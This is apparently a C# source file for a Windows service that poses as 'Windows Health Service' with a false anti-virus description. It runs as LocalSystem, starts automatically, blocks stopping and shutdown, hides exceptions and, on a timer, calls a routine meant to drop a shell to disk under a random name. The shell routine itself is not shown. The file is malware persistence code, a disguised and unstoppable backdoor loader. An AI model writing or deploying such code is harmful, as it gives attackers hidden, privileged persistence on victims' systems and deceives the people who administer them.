using System;
using System.Configuration.Install;
using System.Reflection;
using System.ServiceProcess;
using System.ComponentModel;
using System.Timers;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace ShellManagerService
{
    class Program : ServiceBase
    {
        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += CurrentDomainUnhandledException;
            if (Environment.UserInteractive)
            {
                //if run interactively, just try to uninstall/reinstall any previous versions of the service
                try
                {
                    ManagedInstallerClass.InstallHelper(new string[] { "/u", Assembly.GetExecutingAssembly().Location });
                }
                catch { }
                ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
            }
            else
            {
                //we are running in the service context, so start the service
                Run(new Program());
            }
        }

        private static void CurrentDomainUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            //Eat this exception
            //((Exception)e.ExceptionObject).Message + ((Exception)e.ExceptionObject).InnerException.Message);
        }

        private void DoNotStopTheRock()
        {
            CanStop = false;
            CanShutdown = false;
            CanPauseAndContinue = false;
            CanHandlePowerEvent = false;
        }

        public Program()
        {
            ServiceName = "WindowsHealthService";
            DoNotStopTheRock();
        }

        protected override void OnStart(string[] args)
        {
            var timer = new Timer();
            timer.Interval = 10000; //30 seconds
            timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
            timer.Enabled = true;
            base.OnStart(args);
        }

        private void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            //Will attempt to load shell in disk and start it, only if necessary, by giving it a random ass name
            ShellManager.LoadShellInDisk();
        }

        protected override void OnStop()
        {
            base.OnStop();
        }
    }

    [RunInstaller(true)]
    public class MyWindowsServiceInstaller : Installer
    {
        public MyWindowsServiceInstaller()
        {
            var processInstaller = new ServiceProcessInstaller();
            var serviceInstaller = new ServiceInstaller();
            serviceInstaller.DisplayName = "Windows Health Service";
            serviceInstaller.Description = "Windows Health Service helps in keeping important system resources intact, in case a virus attempts to modify or destroy them";
            serviceInstaller.ServiceName = "WindowsHealthService";
            serviceInstaller.StartType = ServiceStartMode.Automatic;
            processInstaller.Account = ServiceAccount.LocalSystem;
            Installers.Add(processInstaller);
            Installers.Add(serviceInstaller);
            serviceInstaller.AfterInstall += ServiceInstaller_AfterInstall;
        }

        void ServiceInstaller_AfterInstall(object sender, InstallEventArgs e)
        {
            ServiceInstaller serviceInstaller = (ServiceInstaller)sender;

            using (ServiceController sc = new ServiceController(serviceInstaller.ServiceName))
            {
                sc.Start();
            }
        }
    }
}
